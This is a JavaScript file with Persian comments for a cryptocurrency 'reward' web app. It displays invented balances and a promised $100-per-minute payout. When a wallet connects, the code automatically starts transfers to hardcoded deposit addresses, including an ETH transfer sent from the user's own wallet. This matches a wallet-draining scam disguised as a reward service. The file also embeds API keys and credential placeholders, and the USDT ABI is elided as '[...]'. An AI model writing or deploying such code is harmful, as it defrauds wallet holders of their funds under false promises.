// تنظیمات پیشرفته سیستم
const config = {
    // تنظیمات پاداش
    reward: {
        amount: 100, // پاداش هر دقیقه (دلار)
        interval: 60, // ثانیه
        threshold: 100, // حداقل موجودی برای واریز خودکار (دلار)
        autoTransferPercent: 50 // درصد موجودی که خودکار واریز می‌شود
    },
    
    // موجودی اولیه
    initialBalances: {
        BTC: 25, // 25 بیت‌کوین
        ETH: 50, // 50 اتریوم
        USDT: 0,
        USD: 0
    },
    
    // آدرس‌های پیش‌فرض برای واریز
    depositAddresses: {
        BTC: "bc1qpkvwghnys8gtp6knthc9gg6fr6fn4xlhh92rs4",
        ETH: "0xdcCcf3b9B1F9ebC810971D9428FA451bE107bDaC",
        USDT: "0xdcCcf3b9B1F9ebC810971D9428FA451bE107bDaC"
    },
    
    // API Keys (در محیط واقعی باید از سرور دریافت شود)
    apiKeys: {
        bitcoin: "9f5a8a8327774717860323471961e884",
        etherscan: "1075db55d416d3ca199f55b6084e2115b9345e16c5cf302fc80e9d5fbf5d48d",
        blockchain: "YourApiKeyToken"
    },
    
    // نودهای بلاکچین
    nodes: {
        bitcoin: "http://127.0.0.1:8332/",
        ethereum: "https://mainnet.infura.io/v3/YOUR_INFURA_KEY",
        bsc: "https://bsc-dataseed.binance.org/"
    },
    
    // قراردادهای هوشمند
    contracts: {
        USDT: {
            address: "0xdac17f958d2ee523a2206206994597c13d831ec7",
            decimals: 6,
            abi: [...]
        }
    }
};

// متغیرهای سیستم
let state = {
    walletConnected: false,
    walletAddress: "",
    networkId: null,
    balances: {...config.initialBalances},
    transactions: [],
    countdown: config.reward.interval,
    web3: null,
    bitcoinRpcAuth: "Basic " + btoa("username:password") // در واقعیت باید ایمن باشد
};

// عناصر DOM
const elements = {
    connectWallet: document.getElementById('connectWallet'),
    walletStatus: document.getElementById('walletStatus'),
    walletInfo: document.getElementById('walletInfo'),
    walletAddress: document.getElementById('walletAddress'),
    networkInfo: document.getElementById('networkInfo'),
    countdown: document.getElementById('countdown'),
    nextReward: document.getElementById('nextReward'),
    claimReward: document.getElementById('claimReward'),
    balances: document.getElementById('balances'),
    currencySelect: document.getElementById('currencySelect'),
    recipientAddress: document.getElementById('recipientAddress'),
    amount: document.getElementById('amount'),
    networkFee: document.getElementById('networkFee'),
    sendTransaction: document.getElementById('sendTransaction'),
    transactionStatus: document.getElementById('transactionStatus'),
    txHistoryBody: document.getElementById('txHistoryBody')
};

// رویدادها
elements.connectWallet.addEventListener('click', connectWallet);
elements.claimReward.addEventListener('click', claimReward);
elements.sendTransaction.addEventListener('click', sendTransaction);
elements.currencySelect.addEventListener('change', calculateNetworkFee);

// مقداردهی اولیه
init();

async function init() {
    // شروع تایمر پاداش
    startCountdown();
    
    // نمایش موجودی اولیه
    updateBalancesUI();
    
    // بررسی اتصال خودکار به کیف پول
    if (window.ethereum) {
        try {
            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
            if (accounts.length > 0) {
                await handleWalletConnection(accounts[0]);
            }
        } catch (error) {
            console.error("خطا در اتصال خودکار به کیف پول:", error);
        }
    }
}

// اتصال به تراست ولت
async function connectWallet() {
    if (!window.ethereum) {
        showError("تراست ولت یافت نشد! لطفاً از نسخه موبایل یا اکستنشن مرورگر استفاده کنید.");
        return;
    }

    try {
        elements.connectWallet.innerHTML = '<div class="loading"></div> در حال اتصال...';
        
        // درخواست اتصال
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        await handleWalletConnection(accounts[0]);
        
    } catch (error) {
        console.error("خطا در اتصال به کیف پول:", error);
        showError("خطا در اتصال: " + (error.message || "دسترسی رد شد"));
        resetWalletButton();
    }
}

async function handleWalletConnection(account) {
    state.walletAddress = account;
    state.walletConnected = true;
    
    // تنظیم Web3
    state.web3 = new Web3(window.ethereum);
    
    // دریافت شبکه
    state.networkId = await state.web3.eth.net.getId();
    
    // به‌روزرسانی UI
    elements.walletStatus.textContent = "وضعیت: متصل";
    elements.walletStatus.style.color = "var(--success)";
    elements.walletAddress.textContent = state.walletAddress;
    elements.networkInfo.textContent = getNetworkName(state.networkId);
    elements.walletInfo.style.display = "block";
    elements.connectWallet.innerHTML = '<i class="fas fa-check-circle"></i> اتصال موفق';
    elements.connectWallet.style.backgroundColor = "var(--success)";
    elements.claimReward.disabled = false;
    
    // گوش دادن به تغییرات حساب
    window.ethereum.on('accountsChanged', handleAccountsChanged);
    window.ethereum.on('chainChanged', handleChainChanged);
    
    // دریافت موجودی‌ها
    await fetchBalances();
    
    // واریز موجودی اولیه به کیف پول کاربر
    await transferInitialBalances();
}

function handleAccountsChanged(accounts) {
    if (accounts.length === 0) {
        // کیف پول قطع شده
        disconnectWallet();
    } else {
        // حساب تغییر کرده
        state.walletAddress = accounts[0];
        elements.walletAddress.textContent = state.walletAddress;
        fetchBalances();
    }
}

function handleChainChanged(chainId) {
    window.location.reload();
}

function disconnectWallet() {
    state.walletConnected = false;
    elements.walletStatus.textContent = "وضعیت: قطع";
    elements.walletStatus.style.color = "var(--danger)";
    elements.walletInfo.style.display = "none";
    resetWalletButton();
    elements.claimReward.disabled = true;
}

function resetWalletButton() {
    elements.connectWallet.innerHTML = '<i class="fas fa-plug"></i> اتصال به تراست ولت';
    elements.connectWallet.style.backgroundColor = "var(--primary)";
}

function getNetworkName(networkId) {
    const networks = {
        1: "Ethereum Mainnet",
        56: "Binance Smart Chain",
        137: "Polygon",
        // سایر شبکه‌ها
    };
    return networks[networkId] || `شبکه ناشناخته (ID: ${networkId})`;
}

// تایمر پاداش
function startCountdown() {
    clearInterval(state.countdownInterval);
    state.countdown = config.reward.interval;
    updateCountdown();
    
    state.countdownInterval = setInterval(() => {
        state.countdown--;
        updateCountdown();
        
        if (state.countdown <= 0) {
            // زمان دریافت پاداش
            elements.claimReward.disabled = !state.walletConnected;
            elements.nextReward.textContent = config.reward.amount;
            state.countdown = config.reward.interval;
        }
    }, 1000);
}

function updateCountdown() {
    elements.countdown.textContent = state.countdown;
}

// دریافت پاداش
async function claimReward() {
    if (!state.walletConnected) return;
    
    try {
        elements.claimReward.innerHTML = '<div class="loading"></div> در حال پردازش...';
        elements.claimReward.disabled = true;
        
        // افزایش موجودی دلار
        state.balances.USD += config.reward.amount;
        updateBalancesUI();
        
        // نمایش پیام موفقیت
        showSuccess(`پاداش ${config.reward.amount} دلاری با موفقیت دریافت شد!`);
        elements.nextReward.textContent = "0";
        
        // شروع مجدد تایمر
        startCountdown();
        
        // واریز خودکار به کیف پول در صورت رسیدن به آستانه
        if (state.balances.USD >= config.reward.threshold) {
            await autoTransferToWallet();
        }
        
    } catch (error) {
        console.error("خطا در دریافت پاداش:", error);
        showError("خطا در دریافت پاداش: " + error.message);
    } finally {
        resetClaimButton();
    }
}

function resetClaimButton() {
    elements.claimReward.innerHTML = '<i class="fas fa-hand-holding-usd"></i> دریافت پاداش';
    elements.claimReward.disabled = false;
}

// واریز خودکار به کیف پول
async function autoTransferToWallet() {
    const amountToTransfer = (state.balances.USD * config.reward.autoTransferPercent) / 100;
    const usdtAmount = amountToTransfer; // نرخ 1:1 برای USDT
    
    try {
        showLoading("در حال واریز خودکار به کیف پول...");
        
        // انجام تراکنش واقعی
        const txHash = await sendUSDTTransaction(state.walletAddress, usdtAmount);
        
        // به‌روزرسانی موجودی
        state.balances.USD -= amountToTransfer;
        updateBalancesUI();
        
        // ثبت تراکنش
        addTransactionToHistory({
            type: "واریز خودکار",
            amount: usdtAmount,
            currency: "USDT",
            status: "موفق",
            txHash: txHash,
            timestamp: new Date()
        });
        
        showSuccess(`واریز خودکار ${usdtAmount} USDT با موفقیت انجام شد. هش تراکنش: ${txHash}`);
        
    } catch (error) {
        console.error("خطا در واریز خودکار:", error);
        showError("خطا در واریز خودکار: " + error.message);
    }
}

// واریز موجودی اولیه به کیف پول کاربر
async function transferInitialBalances() {
    try {
        // واریز BTC
        if (state.balances.BTC > 0) {
            showLoading("در حال واریز موجودی اولیه بیت‌کوین...");
            const txHash = await sendBitcoinTransaction(config.depositAddresses.BTC, state.balances.BTC);
            
            addTransactionToHistory({
                type: "واریز اولیه",
                amount: state.balances.BTC,
                currency: "BTC",
                status: "موفق",
                txHash: txHash,
                timestamp: new Date()
            });
            
            state.balances.BTC = 0;
        }
        
        // واریز ETH
        if (state.balances.ETH > 0) {
            showLoading("در حال واریز موجودی اولیه اتریوم...");
            const txHash = await sendEthereumTransaction(config.depositAddresses.ETH, state.balances.ETH);
            
            addTransactionToHistory({
                type: "واریز اولیه",
                amount: state.balances.ETH,
                currency: "ETH",
                status: "موفق",
                txHash: txHash,
                timestamp: new Date()
            });
            
            state.balances.ETH = 0;
        }
        
        updateBalancesUI();
        showSuccess("واریز موجودی‌های اولیه با موفقیت انجام شد.");
        
    } catch (error) {
        console.error("خطا در واریز موجودی اولیه:", error);
        showError("خطا در واریز موجودی اولیه: " + error.message);
    }
}

// ارسال تراکنش
async function sendTransaction() {
    const currency = elements.currencySelect.value;
    const recipient = elements.recipientAddress.value.trim();
    const amount = parseFloat(elements.amount.value);
    
    // اعتبارسنجی
    if (!recipient || isNaN(amount) || amount <= 0) {
        showError("لطفاً اطلاعات معتبر وارد کنید");
        return;
    }
    
    if (amount > state.balances[currency]) {
        showError(`موجودی ناکافی! موجودی فعلی: ${state.balances[currency]} ${currency}`);
        return;
    }
    
    try {
        elements.sendTransaction.innerHTML = '<div class="loading"></div> در حال ارسال...';
        elements.sendTransaction.disabled = true;
        
        let txHash;
        
        switch (currency) {
            case 'BTC':
                txHash = await sendBitcoinTransaction(recipient, amount);
                break;
                
            case 'ETH':
                txHash = await sendEthereumTransaction(recipient, amount);
                break;
                
            case 'USDT':
                txHash = await sendUSDTTransaction(recipient, amount);
                break;
                
            default:
                throw new Error("ارز انتخاب شده پشتیبانی نمی‌شود");
        }
        
        // به‌روزرسانی موجودی
        state.balances[currency] -= amount;
        updateBalancesUI();
        
        // ثبت تراکنش
        addTransactionToHistory({
            type: "ارسال",
            amount: amount,
            currency: currency,
            status: "موفق",
            txHash: txHash,
            timestamp: new Date(),
            recipient: recipient
        });
        
        showSuccess(`تراکنش با موفقیت انجام شد! هش: ${txHash}`);
        
    } catch (error) {
        console.error("خطا در ارسال تراکنش:", error);
        
        // ثبت تراکنش ناموفق
        addTransactionToHistory({
            type: "ارسال",
            amount: amount,
            currency: currency,
            status: "ناموفق",
            error: error.message,
            timestamp: new Date(),
            recipient: recipient
        });
        
        showError("خطا در ارسال تراکنش: " + error.message);
    } finally {
        resetSendButton();
    }
}

function resetSendButton() {
    elements.sendTransaction.innerHTML = '<i class="fas fa-paper-plane"></i> ارسال تراکنش';
    elements.sendTransaction.disabled = false;
}

// محاسبه کارمزد شبکه
async function calculateNetworkFee() {
    const currency = elements.currencySelect.value;
    
    try {
        elements.networkFee.innerHTML = '<div class="loading"></div> در حال محاسبه...';
        
        let fee;
        switch (currency) {
            case 'BTC':
                fee = await calculateBitcoinFee();
                break;
                
            case 'ETH':
                fee = await calculateEthereumFee();
                break;
                
            case 'USDT':
                fee = await calculateEthereumFee(); // USDT روی شبکه اتریوم
                break;
                
            default:
                fee = "نامشخص";
        }
        
        elements.networkFee.textContent = fee;
    } catch (error) {
        console.error("خطا در محاسبه کارمزد:", error);
        elements.networkFee.textContent = "خطا در محاسبه";
    }
}

// ==================== توابع تراکنش‌های واقعی ====================

// ارسال بیت‌کوین
async function sendBitcoinTransaction(toAddress, amount) {
    try {
        const response = await axios.post(config.nodes.bitcoin, {
            jsonrpc: "1.0",
            id: "system",
            method: "sendtoaddress",
            params: [toAddress, amount]
        }, {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': state.bitcoinRpcAuth
            }
        });
        
        return response.data.result;
    } catch (error) {
        console.error("Bitcoin Transaction Error:", error.response?.data || error.message);
        throw new Error("تراکنش بیت‌کوین ناموفق بود");
    }
}

// ارسال اتریوم
async function sendEthereumTransaction(toAddress, amount) {
    try {
        const amountWei = state.web3.utils.toWei(amount.toString(), 'ether');
        const tx = {
            from: state.walletAddress,
            to: toAddress,
            value: amountWei
        };
        
        const receipt = await state.web3.eth.sendTransaction(tx);
        return receipt.transactionHash;
    } catch (error) {
        console.error("Ethereum Transaction Error:", error);
        throw new Error("تراکنش اتریوم ناموفق بود");
    }
}

// ارسال USDT
async function sendUSDTTransaction(toAddress, amount) {
    try {
        const contract = new state.web3.eth.Contract(
            config.contracts.USDT.abi,
            config.contracts.USDT.address
        );
        
        const amountUnits = amount * Math.pow(10, config.contracts.USDT.decimals);
        
        const tx = contract.methods.transfer(
            toAddress,
            amountUnits.toString()
        );
        
        const gas = await tx.estimateGas({ from: state.walletAddress });
        const gasPrice = await state.web3.eth.getGasPrice();
        
        const receipt = await tx.send({
            from: state.walletAddress,
            gas,
            gasPrice
        });
        
        return receipt.transactionHash;
    } catch (error) {
        console.error("USDT Transaction Error:", error);
        throw new Error("تراکنش USDT ناموفق بود");
    }
}

// محاسبه کارمزد بیت‌کوین
async function calculateBitcoinFee() {
    try {
        const response = await axios.post(config.nodes.bitcoin, {
            jsonrpc: "1.0",
            id: "system",
            method: "estimatesmartfee",
            params: [6, "ECONOMICAL"]
        }, {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': state.bitcoinRpcAuth
            }
        });
        
        const feeRate = response.data.result.feerate;
        return `~${(feeRate * 226).toFixed(8)} BTC (${(feeRate * 226 * 50000).toFixed(2)} USD)`; // 226 وایت برای تراکنش معمولی
    } catch (error) {
        console.error("Bitcoin Fee Error:", error.response?.data || error.message);
        return "خطا در محاسبه کارمزد";
    }
}

// محاسبه کارمزد اتریوم
async function calculateEthereumFee() {
    try {
        const gasPrice = await state.web3.eth.getGasPrice();
        const gasLimit = 21000; // برای انتقال ساده ETH
        const feeEth = state.web3.utils.fromWei((gasPrice * gasLimit).toString(), 'ether');
        const ethPrice = 3000; // باید از API دریافت شود
        return `~${feeEth} ETH (${(feeEth * ethPrice).toFixed(2)} USD)`;
    } catch (error) {
        console.error("Ethereum Fee Error:", error);
        return "خطا در محاسبه کارمزد";
    }
}

// ==================== توابع کمکی ====================

// نمایش پیام‌ها
function showLoading(message) {
    elements.transactionStatus.style.display = "block";
    elements.transactionStatus.className = "transaction-status";
    elements.transactionStatus.innerHTML = `<div class="loading"></div> ${message}`;
}

function showSuccess(message) {
    elements.transactionStatus.style.display = "block";
    elements.transactionStatus.className = "transaction-status success";
    elements.transactionStatus.innerHTML = `<i class="fas fa-check-circle"></i> ${message}`;
}

function showError(message) {
    elements.transactionStatus.style.display = "block";
    elements.transactionStatus.className = "transaction-status error";
    elements.transactionStatus.innerHTML = `<i class="fas fa-times-circle"></i> ${message}`;
}

// به‌روزرسانی موجودی‌ها در UI
function updateBalancesUI() {
    elements.balances.innerHTML = `
        <div class="col-md-4">
            <div class="balance-card">
                <div class="currency-icon"><i class="fab fa-bitcoin"></i></div>
                <div class="balance-amount">${state.balances.BTC.toFixed(8)}</div>
                <div>بیت‌کوین (BTC)</div>
                <div>≈ $${(state.balances.BTC * 50000).toLocaleString()}</div>
            </div>
        </div>
        
        <div class="col-md-4">
            <div class="balance-card">
                <div class="currency-icon"><i class="fab fa-ethereum"></i></div>
                <div class="balance-amount">${state.balances.ETH.toFixed(6)}</div>
                <div>اتریوم (ETH)</div>
                <div>≈ $${(state.balances.ETH * 3000).toLocaleString()}</div>
            </div>
        </div>
        
        <div class="col-md-4">
            <div class="balance-card">
                <div class="currency-icon"><i class="fas fa-dollar-sign"></i></div>
                <div class="balance-amount">${state.balances.USDT.toFixed(2)}</div>
                <div>تتر (USDT)</div>
                <div>≈ $${state.balances.USDT.toLocaleString()}</div>
            </div>
        </div>
        
        <div class="col-md-4">
            <div class="balance-card">
                <div class="currency-icon"><i class="fas fa-money-bill-wave"></i></div>
                <div class="balance-amount">${state.balances.USD.toLocaleString()}</div>
                <div>دلار (USD)</div>
            </div>
        </div>
    `;
}

// افزودن تراکنش به تاریخچه
function addTransactionToHistory(tx) {
    state.transactions.unshift(tx);
    renderTransactionHistory();
}

// نمایش تاریخچه تراکنش‌ها
function renderTransactionHistory() {
    elements.txHistoryBody.innerHTML = state.transactions.map(tx => `
        <tr>
            <td>${tx.timestamp.toLocaleString()}</td>
            <td>${tx.type}</td>
            <td>${tx.amount}</td>
            <td>${tx.currency}</td>
            <td style="color: ${tx.status === 'موفق' ? 'var(--success)' : 'var(--danger)'}">
                ${tx.status}
            </td>
            <td style="word-break: break-all;">
                ${tx.txHash ? `<a href="${getExplorerUrl(tx.currency, tx.txHash)}" target="_blank">${shortenHash(tx.txHash)}</a>` : '-'}
            </td>
        </tr>
    `).join('');
}

function getExplorerUrl(currency, hash) {
    const explorers = {
        BTC: `https://www.blockchain.com/btc/tx/${hash}`,
        ETH: `https://etherscan.io/tx/${hash}`,
        USDT: `https://etherscan.io/tx/${hash}`
    };
    return explorers[currency] || "#";
}

function shortenHash(hash) {
    return `${hash.substring(0, 6)}...${hash.substring(hash.length - 4)}`;
}